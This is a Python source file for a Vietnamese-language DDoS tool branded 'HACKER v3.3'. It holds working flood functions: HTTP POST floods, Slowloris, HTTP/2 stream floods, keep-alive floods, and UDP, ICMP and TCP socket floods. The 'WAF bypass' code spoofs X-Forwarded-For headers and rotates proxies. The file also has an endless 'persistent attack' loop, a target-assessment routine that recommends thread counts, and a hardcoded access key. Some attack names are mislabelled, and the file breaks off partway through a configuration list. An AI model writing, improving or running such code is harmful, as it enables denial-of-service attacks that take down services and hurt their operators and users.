#!/usr/bin/env python3

# -*- coding: utf-8 -*-
# ©️ Quang Bảo 2025 - All Rights Reserved

import requests
import threading
import multiprocessing
import time
import urllib.parse
import os
import random
import hashlib
import json
from datetime import datetime
from colorama import init, Fore, Back, Style
import socket
import ssl
import whois
import dns.resolver
from bs4 import BeautifulSoup
import hmac
import base64
import sys
import struct
import asyncio
import http.client
import aiohttp
from concurrent.futures import ThreadPoolExecutor

# Attempt to import h2 for HTTP/2 support
try:
    import h2.connection
    import h2.config
    HTTP2_AVAILABLE = True
except ImportError:
    HTTP2_AVAILABLE = False
    print(f"{Fore.YELLOW}[CẢNH BÁO] Không tìm thấy module 'h2'. Tấn công HTTP/2 sẽ bị vô hiệu hóa. Cài đặt bằng 'pip install h2'{Fore.RESET}")

# Initialize colorama
init()

# Fallback ANSI codes
try:
    from colorama import init, Fore, Back, Style
    init()
except ImportError:
    class Fore:
        CYAN = '\033[96m'
        BLUE = '\033[94m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        RED = '\033[91m'
        MAGENTA = '\033[95m'
        WHITE = '\033[97m'
        RESET = '\033[0m'

    class Back:
        BLACK = '\033[40m'
        BLUE = '\033[44m'
        CYAN = '\033[46m'
        RESET = '\033[0m'

    class Style:
        BRIGHT = '\033[1m'
        RESET_ALL = '\033[0m'

# Hacker-style ASCII banner
def display_banner():
    banner = f"""
{Fore.RED}{Style.BRIGHT}
╔═══[ QUANG BẢO © 2025 ]═══╗
║  💀 HỆ THỐNG HACKER v3.3 💀 ║
║  🚀 GIAO THỨC: ULTIMATE-X 🚀 ║
║  © QUANG BẢO - MỌI QUYỀN ĐƯỢC BẢO LƯU ║
╚════════════════════════════╝{Style.RESET_ALL}{Fore.RESET}
    """
    print(banner)

# File integrity check
EXPECTED_HASH = None

def check_file_integrity():
    global EXPECTED_HASH
    try:
        with open(__file__, 'rb') as f:
            file_content = f.read()
            file_hash = hashlib.sha256(file_content).hexdigest()
            if EXPECTED_HASH is None:
                EXPECTED_HASH = file_hash
                print(f"{Fore.YELLOW}[HỆ THỐNG] Tạo mã băm mới: {file_hash}{Fore.RESET}")
            elif file_hash != EXPECTED_HASH:
                print(f"{Fore.RED}[LỖI NGHIÊM TRỌNG] Tệp bị thay đổi! Thoát.{Fore.RESET}")
                exit(1)
    except Exception as e:
        print(f"{Fore.RED}[LỖI NGHIÊM TRỌNG] Kiểm tra tính toàn vẹn thất bại: {str(e)}{Fore.RESET}")
        exit(1)

# Clear screen
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Minimal target selection effect
def target_selection_effect(target_type):
    frames = [
        f"{Fore.RED}{Style.BRIGHT}[+] KHÓA MỤC TIÊU: {target_type.upper()} [20%]...{Style.RESET_ALL}{Fore.RESET}",
        f"{Fore.YELLOW}{Style.BRIGHT}[+] KHÓA MỤC TIÊU: {target_type.upper()} [50%]...{Style.RESET_ALL}{Fore.RESET}",
        f"{Fore.CYAN}{Style.BRIGHT}[+] KHÓA MỤC TIÊU: {target_type.upper()} [80%]...{Style.RESET_ALL}{Fore.RESET}",
        f"{Fore.GREEN}{Style.BRIGHT}[+] MỤC TIÊU ĐÃ KHÓA: {target_type.upper()} [100%]!{Style.RESET_ALL}{Fore.RESET}"
    ]
    for frame in frames:
        clear_screen()
        print(frame)
        time.sleep(0.3)

# User-Agent list
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
]

# Random headers for WAF bypass
def generate_random_headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': random.choice(['text/html', 'application/json', '*/*']),
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.9', 'fr-FR,fr;q=0.8']),
        'Accept-Encoding': random.choice(['gzip, deflate', 'br', 'identity']),
        'Connection': 'keep-alive',
        'Cache-Control': random.choice(['no-cache', 'max-age=0']),
        'Referer': random.choice(['https://google.com', 'https://bing.com', 'https://yahoo.com']),
        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        'DNT': random.choice(['1', '0']),
    }

# Proxy list for rotation
PROXY_LIST = [
    # Add your proxy list here, e.g., {'http': 'http://proxy1:port', 'https': 'https://proxy1:port'},
    # Example: {'http': 'http://123.45.67.89:8080', 'https': 'https://123.45.67.89:8080'},
]
def get_random_proxy():
    return random.choice(PROXY_LIST) if PROXY_LIST else None

# Random POST data
POST_DATA = {
    "key": random.randint(1, 9999999),
    "value": random.random(),
    "secret": "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16)),
    "token": hashlib.md5(str(time.time()).encode()).hexdigest(),
    "attack_vector": random.choice(["destroy", "obliterate", "annihilate"])
}

# Global counters
manager = threading.Lock()
success_count = 0
error_count = 0
response_times = []

# Validate URL
def validate_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    try:
        result = urllib.parse.urlparse(url)
        if not result.scheme or not result.netloc:
            raise ValueError("URL không hợp lệ")
        return url
    except Exception as e:
        raise ValueError(f"URL không hợp lệ: {e}")

# Save attack configuration for persistent mode
def save_attack_config(url, num_threads, requests_per_thread, target_type):
    config = {
        "url": url,
        "num_threads": num_threads,
        "requests_per_thread": requests_per_thread,
        "target_type": target_type,
        "start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    try:
        with open("persistent_attack.json", "w") as f:
            json.dump(config, f)
        print(f"{Fore.YELLOW}[HỆ THỐNG] Cấu hình tấn công liên tục đã lưu: {url}{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}[LỖI] Không thể lưu cấu hình tấn công: {str(e)}{Fore.RESET}")

# Persistent attack process
def persistent_attack_process(url, requests_per_thread):
    session = requests.Session()
    methods = ["GET", "POST", "HEAD"]
    while True:
        try:
            method = random.choice(methods)
            headers = generate_random_headers()
            proxy = get_random_proxy()
            payload = "X" * random.randint(102400, 204800)
            if method == "GET":
                response = session.get(url, headers=headers, proxies=proxy, timeout=2)
            elif method == "POST":
                response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=2)
            else:
                response = session.head(url, headers=headers, proxies=proxy, timeout=2)
            if response.status_code in (429, 403, 522):
                print(f"{Fore.RED}[LIÊN TỤC] Tấn công: Mã trạng thái {response.status_code} - MỤC TIÊU QUÁ TẢI{Fore.RESET}")
            else:
                print(f"{Fore.YELLOW}[LIÊN TỤC] Tấn công: Mã trạng thái {response.status_code}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[LIÊN TỤC] Tấn công thất bại: {str(e)}{Fore.RESET}")
        time.sleep(random.uniform(0.0001, 0.001))

# HTTP/2 Multiplexing attack
def http2_multiplexing_attack(url):
    if not HTTP2_AVAILABLE:
        print(f"{Fore.RED}[HTTP/2] Tấn công bị vô hiệu hóa: Chưa cài đặt module 'h2'{Fore.RESET}")
        return
    parsed_url = urllib.parse.urlparse(url)
    host = parsed_url.hostname
    port = parsed_url.port or 443
    try:
        conn = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
        h2_conn = h2.connection.H2Connection()
        h2_conn.initiate_connection()
        conn.send(h2_conn.data_to_send())
        headers = {
            ':method': 'GET',
            ':path': '/',
            ':scheme': 'https',
            ':authority': host,
            'user-agent': random.choice(USER_AGENTS),
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
        }
        while True:
            for stream_id in range(1, 100, 2):  # Multiple streams
                h2_conn.send_headers(stream_id, headers)
                conn.send(h2_conn.data_to_send())
            response = conn.getresponse()
            response.read()
            if response.status in (429, 403, 522):
                print(f"{Fore.RED}[HTTP/2] Tấn công: Mã trạng thái {response.status} - MỤC TIÊU QUÁ TẢI{Fore.RESET}")
            else:
                print(f"{Fore.YELLOW}[HTTP/2] Tấn công: Mã trạng thái {response.status}{Fore.RESET}")
            time.sleep(0.001)
    except Exception as e:
        print(f"{Fore.RED}[HTTP/2] Tấn công thất bại: {str(e)}{Fore.RESET}")
    finally:
        conn.close()

# Keep-Alive + Pipelining attack
def keep_alive_pipelining_attack(url):
    session = requests.Session()
    headers = generate_random_headers()
    headers['Connection'] = 'keep-alive'
    headers['Keep-Alive'] = 'timeout=5, max=1000'
    proxy = get_random_proxy()
    while True:
        try:
            for _ in range(10):  # Pipeline multiple requests
                session.get(url, headers=headers, proxies=proxy, timeout=2)
            response = session.get(url, headers=headers, proxies=proxy, timeout=2)
            if response.status_code in (429, 403, 522):
                print(f"{Fore.RED}[KEEP-ALIVE] Tấn công: Mã trạng thái {response.status_code} - MỤC TIÊU QUÁ TẢI{Fore.RESET}")
            else:
                print(f"{Fore.YELLOW}[KEEP-ALIVE] Tấn công: Mã trạng thái {response.status_code}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[KEEP-ALIVE] Tấn công thất bại: {str(e)}{Fore.RESET}")
        time.sleep(0.001)

# Multiprocessing attack
def multiprocessing_attack(url, requests_per_process):
    session = requests.Session()
    methods = ["GET", "POST", "HEAD"]
    while True:
        try:
            method = random.choice(methods)
            headers = generate_random_headers()
            proxy = get_random_proxy()
            payload = "X" * random.randint(102400, 204800)
            if method == "GET":
                response = session.get(url, headers=headers, proxies=proxy, timeout=2)
            elif method == "POST":
                response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=2)
            else:
                response = session.head(url, headers=headers, proxies=proxy, timeout=2)
            if response.status_code in (429, 403, 522):
                print(f"{Fore.RED}[ĐA TIẾN TRÌNH] Tấn công: Mã trạng thái {response.status_code} - MỤC TIÊU QUÁ TẢI{Fore.RESET}")
            else:
                print(f"{Fore.YELLOW}[ĐA TIẾN TRÌNH] Tấn công: Mã trạng thái {response.status_code}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[ĐA TIẾN TRÌNH] Tấn công thất bại: {str(e)}{Fore.RESET}")
        time.sleep(0.001)

# Multiprocessing + Async attack
async def async_request(url, session):
    try:
        headers = generate_random_headers()
        proxy = get_random_proxy()
        async with session.get(url, headers=headers, proxy=proxy, timeout=2) as response:
            if response.status in (429, 403, 522):
                print(f"{Fore.RED}[ĐA TIẾN TRÌNH+ASYNC] Tấn công: Mã trạng thái {response.status} - MỤC TIÊU QUÁ TẢI{Fore.RESET}")
            else:
                print(f"{Fore.YELLOW}[ĐA TIẾN TRÌNH+ASYNC] Tấn công: Mã trạng thái {response.status}{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}[ĐA TIẾN TRÌNH+ASYNC] Tấn công thất bại: {str(e)}{Fore.RESET}")

async def multiprocessing_async_attack(url):
    async with aiohttp.ClientSession(headers=generate_random_headers()) as session:
        while True:
            tasks = [async_request(url, session) for _ in range(10)]
            await asyncio.gather(*tasks)
            await asyncio.sleep(0.001)

def multiprocessing_async_wrapper(url, requests_per_process):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(multiprocessing_async_attack(url))

# Layer 4 UDP Flood
def udp_flood_attack(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            payload = os.urandom(random.randint(64, 1400))
            sock.sendto(payload, (host, port))
            print(f"{Fore.RED}[UDP FLOOD] Gửi gói tin đến {host}:{port}{Fore.RESET}")
            time.sleep(0.0001)
    except Exception as e:
        print(f"{Fore.RED}[UDP FLOOD] Tấn công thất bại: {str(e)}{Fore.RESET}")
    finally:
        sock.close()

# Layer 4 ICMP Flood (Ping of Death)
def icmp_flood_attack(host):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.settimeout(1)
        while True:
            # Craft ICMP packet (Ping of Death with large payload)
            payload = os.urandom(60000)  # Oversized payload to stress target
            icmp_packet = struct.pack("!BBHHH", 8, 0, 0, 0, 0) + payload
            sock.sendto(icmp_packet, (host, 0))
            print(f"{Fore.RED}[ICMP FLOOD] Gửi gói tin ICMP đến {host}{Fore.RESET}")
            time.sleep(0.0001)
    except PermissionError:
        print(f"{Fore.RED}[ICMP FLOOD] Lỗi: Cần quyền root để gửi gói tin ICMP{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}[ICMP FLOOD] Tấn công thất bại: {str(e)}{Fore.RESET}")
    finally:
        sock.close()

# Layer 4 TCP/UDP Flood attack
def layer4_tcp_udp_flood(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        attack_types = ["SYN", "ACK", "RST"]
        while True:
            try:
                attack_type = random.choice(attack_types)
                if attack_type == "SYN":
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((host, port))
                    sock.send(b"\x00" * random.randint(64, 1400))
                elif attack_type == "ACK":
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((host, port))
                    sock.send(b"\x10" * random.randint(64, 1400))
                else:  # RST
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((host, port))
                    sock.send(b"\x04" * random.randint(64, 1400))
                print(f"{Fore.RED}[TCP/UDP FLOOD] Gửi {attack_type} đến {host}:{port}{Fore.RESET}")
            except:
                pass  # Ignore connection errors to keep flooding
            time.sleep(0.0001)
    except Exception as e:
        print(f"{Fore.RED}[TCP/UDP FLOOD] Tấn công thất bại: {str(e)}{Fore.RESET}")
    finally:
        sock.close()

# Layer 7 WAF Bypass attack
def layer7_waf_bypass_attack(url):
    session = requests.Session()
    methods = ["GET", "POST", "HEAD"]
    while True:
        try:
            method = random.choice(methods)
            headers = generate_random_headers()
            proxy = get_random_proxy()
            payload = "X" * random.randint(102400, 204800)
            if HTTP2_AVAILABLE and urllib.parse.urlparse(url).scheme == 'https':
                http2_multiplexing_attack(url)
            else:
                headers['Connection'] = 'keep-alive'
                headers['Keep-Alive'] = 'timeout=5, max=1000'
                if method == "GET":
                    response = session.get(url, headers=headers, proxies=proxy, timeout=2)
                elif method == "POST":
                    response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=2)
                else:
                    response = session.head(url, headers=headers, proxies=proxy, timeout=2)
                if response.status_code in (429, 403, 522):
                    print(f"{Fore.RED}[WAF BYPASS] Tấn công: Mã trạng thái {response.status_code} - MỤC TIÊU QUÁ TẢI{Fore.RESET}")
                else:
                    print(f"{Fore.YELLOW}[WAF BYPASS] Tấn công: Mã trạng thái {response.status_code}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[WAF BYPASS] Tấn công thất bại: {str(e)}{Fore.RESET}")
        time.sleep(random.uniform(0.0001, 0.001))

# Slowloris / Slow Headers attack
def slowloris_attack(url, duration):
    session = requests.Session()
    sockets = []
    try:
        for _ in range(500):
            headers = generate_random_headers()
            headers['Connection'] = 'keep-alive'
            sock = session.get(url, headers=headers, proxies=get_random_proxy(), timeout=30, stream=True)
            sockets.append(sock)
            time.sleep(0.01)
        time.sleep(duration)
    except Exception as e:
        print(f"{Fore.RED}[SLOWLORIS] Lỗi: {str(e)}{Fore.RESET}")
    finally:
        for sock in sockets:
            sock.close()

# HTTP Flood attack
def http_flood_attack(url, request_count):
    session = requests.Session()
    while True:
        try:
            headers = generate_random_headers()
            proxy = get_random_proxy()
            payload = "A" * 102400
            response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=5)
            print(f"{Fore.RED}[HTTP FLOOD] Tấn công: Mã trạng thái {response.status_code}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[HTTP FLOOD] Tấn công thất bại: {str(e)}{Fore.RESET}")
        time.sleep(0.001)

# Unlimited threads attack
def unlimited_threads_attack(url):
    session = requests.Session()
    while True:
        try:
            headers = generate_random_headers()
            proxy = get_random_proxy()
            payload = "A" * 102400
            response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=3)
            print(f"{Fore.RED}[VÔ HẠN] Tấn công: Mã trạng thái {response.status_code}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[VÔ HẠN] Tấn công thất bại: {str(e)}{Fore.RESET}")
        time.sleep(0.001)

# 429/403 Overload attack
def overload_429_403_attack(url, request_count):
    session = requests.Session()
    while True:
        try:
            headers = generate_random_headers()
            proxy = get_random_proxy()
            method = random.choice(["GET", "POST", "HEAD"])
            if method == "GET":
                response = session.get(url, headers=headers, proxies=proxy, timeout=2)
            elif method == "POST":
                response = session.post(url, data=POST_DATA, headers=headers, proxies=proxy, timeout=2)
            else:
                response = session.head(url, headers=headers, proxies=proxy, timeout=2)
            if response.status_code in (429, 403):
                print(f"{Fore.RED}[QUÁ TẢI 429/403] Tấn công: Mã trạng thái {response.status_code} - MỤC TIÊU QUÁ TẢI{Fore.RESET}")
            else:
                print(f"{Fore.YELLOW}[QUÁ TẢI 429/403] Tấn công: Mã trạng thái {response.status_code}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[QUÁ TẢI 429/403] Tấn công thất bại: {str(e)}{Fore.RESET}")
        time.sleep(0.0005)

# 522 Blitz attack
def blitz_522_attack(url, request_count):
    session = requests.Session()
    while True:
        try:
            headers = generate_random_headers()
            proxy = get_random_proxy()
            payload = "X" * 204800
            response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=1)
            if response.status_code == 522:
                print(f"{Fore.RED}[BLITZ 522] Tấn công: Mã trạng thái 522 - KẾT NỐI MỤC TIÊU NGẮT!{Fore.RESET}")
            else:
                print(f"{Fore.YELLOW}[BLITZ 522] Tấn công: Mã trạng thái {response.status_code}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[BLITZ 522] Tấn công thất bại: {str(e)}{Fore.RESET}")
        time.sleep(0.0003)

# Combined attack
def combined_all_attack(url, request_count):
    session = requests.Session()
    methods = ["GET", "POST", "HEAD"]
    while True:
        try:
            headers = generate_random_headers()
            proxy = get_random_proxy()
            payload = "X" * random.randint(102400, 204800)
            attack_type = random.choice(["slowloris", "flood", "429403", "522", "http2", "keep_alive"])
            if attack_type == "slowloris":
                sock = session.get(url, headers=headers, proxies=proxy, timeout=30, stream=True)
                print(f"{Fore.RED}[KẾT HỢP] Tấn công: Kết nối Slowloris giữ{Fore.RESET}")
                time.sleep(0.01)
                sock.close()
            elif attack_type == "flood":
                response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=5)
                print(f"{Fore.RED}[KẾT HỢP] Tấn công: HTTP Flood - Mã trạng thái {response.status_code}{Fore.RESET}")
            elif attack_type == "429403":
                method = random.choice(methods)
                if method == "GET":
                    response = session.get(url, headers=headers, proxies=proxy, timeout=2)
                elif method == "POST":
                    response = session.post(url, data=POST_DATA, headers=headers, proxies=proxy, timeout=2)
                else:
                    response = session.head(url, headers=headers, proxies=proxy, timeout=2)
                if response.status_code in (429, 403):
                    print(f"{Fore.RED}[KẾT HỢP] Tấn công: 429/403 - MỤC TIÊU QUÁ TẢI{Fore.RESET}")
                else:
                    print(f"{Fore.YELLOW}[KẾT HỢP] Tấn công: 429/403 - Mã trạng thái {response.status_code}{Fore.RESET}")
            elif attack_type == "522":
                response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=1)
                if response.status_code == 522:
                    print(f"{Fore.RED}[KẾT HỢP] Tấn công: 522 - KẾT NỐI MỤC TIÊU NGẮT!{Fore.RESET}")
                else:
                    print(f"{Fore.YELLOW}[KẾT HỢP] Tấn công: 522 - Mã trạng thái {response.status_code}{Fore.RESET}")
            elif attack_type == "http2" and HTTP2_AVAILABLE:
                http2_multiplexing_attack(url)
            else:
                keep_alive_pipelining_attack(url)
        except Exception as e:
            print(f"{Fore.RED}[KẾT HỢP] Tấn công thất bại: {str(e)}{Fore.RESET}")
        time.sleep(random.uniform(0.0002, 0.001))

# Layer 3/4 UDP Flood and Amplification attack
def layer3_4_attack(host, port, request_count):
    udp_flood_attack(host, port)

# Multi-vector attack
def multi_vector_attack(url, request_count):
    session = requests.Session()
    methods = ["GET", "POST", "HEAD"]
    parsed_url = urllib.parse.urlparse(url)
    host = parsed_url.hostname
    port = parsed_url.port or 80
    while True:
        try:
            headers = generate_random_headers()
            proxy = get_random_proxy()
            attack_type = random.choice(["slowloris", "flood", "429403", "522", "layer3_4", "http2", "keep_alive"])
            if attack_type == "slowloris":
                sock = session.get(url, headers=headers, proxies=proxy, timeout=30, stream=True)
                print(f"{Fore.RED}[ĐA VECTOR] Tấn công: Kết nối Slowloris giữ{Fore.RESET}")
                time.sleep(0.01)
                sock.close()
            elif attack_type == "flood":
                payload = "X" * random.randint(102400, 204800)
                response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=5)
                print(f"{Fore.RED}[ĐA VECTOR] Tấn công: HTTP Flood - Mã trạng thái {response.status_code}{Fore.RESET}")
            elif attack_type == "429403":
                method = random.choice(methods)
                if method == "GET":
                    response = session.get(url, headers=headers, proxies=proxy, timeout=2)
                elif method == "POST":
                    response = session.post(url, data=POST_DATA, headers=headers, proxies=proxy, timeout=2)
                else:
                    response = session.head(url, headers=headers, proxies=proxy, timeout=2)
                if response.status_code in (429, 403):
                    print(f"{Fore.RED}[ĐA VECTOR] Tấn công: 429/403 - MỤC TIÊU QUÁ TẢI{Fore.RESET}")
                else:
                    print(f"{Fore.YELLOW}[ĐA VECTOR] Tấn công: 429/403 - Mã trạng thái {response.status_code}{Fore.RESET}")
            elif attack_type == "522":
                payload = "X" * 204800
                response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=1)
                if response.status_code == 522:
                    print(f"{Fore.RED}[ĐA VECTOR] Tấn công: 522 - KẾT NỐI MỤC TIÊU NGẮT!{Fore.RESET}")
                else:
                    print(f"{Fore.YELLOW}[ĐA VECTOR] Tấn công: 522 - Mã trạng thái {response.status_code}{Fore.RESET}")
            elif attack_type == "layer3_4":
                layer3_4_attack(host, port, 1)
            elif attack_type == "http2" and HTTP2_AVAILABLE:
                http2_multiplexing_attack(url)
            else:
                keep_alive_pipelining_attack(url)
        except Exception as e:
            print(f"{Fore.RED}[ĐA VECTOR] Tấn công thất bại: {str(e)}{Fore.RESET}")
        time.sleep(random.uniform(0.0002, 0.001))

# Layer 7 attack
def layer7_attack(url, request_count):
    if random.choice([True, False]):
        layer7_waf_bypass_attack(url)
    else:
        if HTTP2_AVAILABLE and urllib.parse.urlparse(url).scheme == 'https':
            http2_multiplexing_attack(url)
        else:
            keep_alive_pipelining_attack(url)

# Volumetric attack (UDP/ICMP Flood)
def volumetric_attack(host, port):
    attack_type = random.choice(["udp", "icmp"])
    if attack_type == "udp":
        udp_flood_attack(host, port)
    else:
        icmp_flood_attack(host)

# Protocol attack (TCP SYN/ACK/RST Flood)
def protocol_attack(host, port):
    layer4_tcp_udp_flood(host, port)

# Application layer attack (HTTP Flood with WAF bypass)
def application_layer_attack(url):
    layer7_waf_bypass_attack(url)

# Send request
def send_request(url, request_count):
    global success_count, error_count, response_times
    session = requests.Session()
    methods = ["GET", "POST", "HEAD"]
    while True:
        try:
            method = random.choice(methods)
            headers = generate_random_headers()
            proxy = get_random_proxy()
            delay = random.uniform(0, 0.0001)
            time.sleep(delay)
            start_time = time.perf_counter()
            if method == "GET":
                response = session.get(url, headers=headers, proxies=proxy, timeout=3, allow_redirects=True)
            elif method == "HEAD":
                response = session.head(url, headers=headers, proxies=proxy, timeout=3, allow_redirects=True)
            else:
                response = session.post(url, data=POST_DATA, headers=headers, proxies=proxy, timeout=3, allow_redirects=True)
            end_time = time.perf_counter()
            response_time = (end_time - start_time) * 1000
            with manager:
                success_count += 1
                response_times.append(response_time)
            if response.status_code in (503, 429, 522):
                print(f"{Fore.YELLOW}[TẤN CÔNG] {method} Tấn công: Mã trạng thái {response.status_code} | Thời gian: {response_time:.2f}ms | Mục tiêu: ĐANG QUÁ TẢI{Fore.RESET}")
            else:
                print(f"{Fore.YELLOW}[TẤN CÔNG] {method} Tấn công: Mã trạng thái {response.status_code} | Thời gian: {response_time:.2f}ms | Mục tiêu: ĐANG CHỊU ÁP LỰC{Fore.RESET}")
        except requests.exceptions.RequestException as e:
            with manager:
                error_count += 1
            print(f"{Fore.RED}[TẤN CÔNG THẤT BẠI] Lỗi: {str(e)}{Fore.RESET}")
        except Exception as e:
            with manager:
                error_count += 1
            print(f"{Fore.RED}[TẤN CÔNG THẤT BẠI] Lỗi: {str(e)}{Fore.RESET}")

# Loading animation
def loading_animation(text="Chuẩn bị triển khai tấn công", duration=3):
    print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] {text}...{Style.RESET_ALL}{Fore.RESET}")
    for _ in range(3):
        print(f"{Fore.YELLOW}█{Fore.RESET}", end="", flush=True)
        time.sleep(duration / 3)
    print(f"\n{Fore.GREEN}{Style.BRIGHT}[HỆ THỐNG] {text} - Hoàn tất!{Style.RESET_ALL}{Fore.RESET}")

# Enhanced key generation with HMAC
def generate_key_hash(key):
    secret = "QUANGBAO2025ULTIMATE"
    return hmac.new(secret.encode(), key.encode(), hashlib.sha512).hexdigest()

# Enhanced key validation
def validate_key():
    VALID_KEY = "baoddos"
    VALID_KEY_HASH = generate_key_hash(VALID_KEY)
    attempts = 0
    max_attempts = 3

    while attempts < max_attempts:
        clear_screen()
        display_banner()
        print(f"{Fore.YELLOW}Nhập mã truy cập: {Fore.WHITE}", end="")
        user_key = input().strip()
        loading_animation("Xác minh thông tin", 2)

        if generate_key_hash(user_key) == VALID_KEY_HASH:
            print(f"{Fore.GREEN}{Style.BRIGHT}[HỆ THỐNG] Truy cập được cấp! Hệ thống kích hoạt.{Style.RESET_ALL}{Fore.RESET}")
            time.sleep(1)
            return True
        else:
            attempts += 1
            remaining = max_attempts - attempts
            print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Mã không hợp lệ! Còn {remaining} lần thử.{Style.RESET_ALL}{Fore.RESET}")
            if remaining == 0:
                print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Truy cập bị khóa!{Style.RESET_ALL}{Fore.RESET}")
                return False
            time.sleep(1)

# Enhanced website security assessment
def assess_target_security(url):
    session = requests.Session()
    error_message = None
    try:
        response_times = []
        status_codes = []
        for _ in range(10):
            start_time = time.perf_counter()
            try:
                response = session.get(url, headers=generate_random_headers(), proxies=get_random_proxy(), timeout=5)
                end_time = time.perf_counter()
                response_times.append((end_time - start_time) * 1000)
                status_codes.append(response.status_code)
            except requests.exceptions.Timeout:
                error_message = "Lỗi kết nối: Hết thời gian"
                break
            except requests.exceptions.ConnectionError:
                error_message = "Lỗi kết nối: Không thể kết nối"
                break
            except requests.exceptions.RequestException as e:
                error_message = f"Lỗi kết nối: {str(e)}"
                break
            time.sleep(0.1)

        if error_message:
            print(f"{Fore.RED}[LỖI] {error_message}{Fore.RESET}")
            return "CAO", 2000, 1000

        avg_response_time = sum(response_times) / len(response_times)
        error_rate = status_codes.count(500) / len(status_codes)

        security_score = 0
        if avg_response_time < 1000:
            security_score += 30
        if error_rate < 0.1:
            security_score += 20

        if security_score < 50:
            security_level = "THẤP"
            recommended_threads = 500
            recommended_requests = 200
            print(f"{Fore.GREEN}[KẾT QUẢ] Mục tiêu: Bảo mật thấp - Dễ tấn công{Fore.RESET}")
        elif security_score < 80:
            security_level = "TRUNG BÌNH"
            recommended_threads = 1000
            recommended_requests = 500
            print(f"{Fore.YELLOW}[KẾT QUẢ] Mục tiêu: Bảo mật trung bình - Cần lực lượng vừa phải{Fore.RESET}")
        else:
            security_level = "CAO"
            recommended_threads = 2000
            recommended_requests = 1000
            print(f"{Fore.RED}[KẾT QUẢ] Mục tiêu: Bảo mật cao - Cần lực lượng tối đa{Fore.RESET}")

        return security_level, recommended_threads, recommended_requests
    except Exception as e:
        print(f"{Fore.RED}[LỖI] Lỗi nghiêm trọng: {str(e)}{Fore.RESET}")
        return "CAO", 2000, 1000

# Target configurations
TARGET_CONFIGS = [
    {"id": "1", "name": "small", "threads": 1000, "requests": 500, "desc": "Tấn công gọn nhẹ với 500K lượt đánh", "level": "Thấp", "application": "Kiểm tra căng thẳng cơ bản"},
    {"id": "2", "name": "large", "threads": 2000, "requests": 1000, "desc": "Tấn công quy mô lớn với 2M lượt đánh", "level": "Thấp-Trung bình", "application": "Mục tiêu bảo mật trung bình"},
    {"id": "3", "name": "mega", "threads": 5000, "requests": 1000, "desc": "Tấn công mạnh mẽ với 5K luồng", "level": "Trung bình", "application": "Mục tiêu lưu lượng trung bình"},
    {"id": "4", "name": "ultra", "threads": 10000, "requests": 1000, "desc": "Siêu tấn công với 10K luồng", "level": "Trung bình-Cao", "application": "Mục tiêu được bảo vệ tốt"},
    {"id": "5", "name": "infinite", "threads": 2000, "requests": 1000, "desc": "Tấn công vòng lặp vô hạn", "level": "Trung bình-Cao", "application": "Tấn công liên tục"},
